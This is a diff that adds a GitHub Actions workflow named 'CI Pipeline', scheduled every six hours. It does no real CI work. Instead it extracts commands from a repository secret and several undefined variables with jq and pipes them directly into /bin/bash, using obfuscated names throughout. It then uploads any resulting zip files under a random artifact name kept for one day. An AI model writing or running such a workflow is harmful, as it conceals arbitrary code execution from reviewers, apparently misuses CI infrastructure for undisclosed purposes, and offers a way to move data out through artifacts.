@@ -1,0 +1,31 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '0 0,6,12,18 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  agent:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Perform
+        env:
+          xtd2018: ${{ secrets.xtd2018 }}
+        run: |
+          printf '%s' "$xtd2018" | jq -r .odrsg4330 | /bin/bash
+          printf '%s' "$nz47440" | jq -r .x54762 | /bin/bash
+          echo $qd7340 | jq -r .qw99308 | /bin/bash
+          printf '%s' "$tys3363" | jq -r .bqk72 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: tFZCwMtL
+          path: "*.zip"
+          retention-days: 1
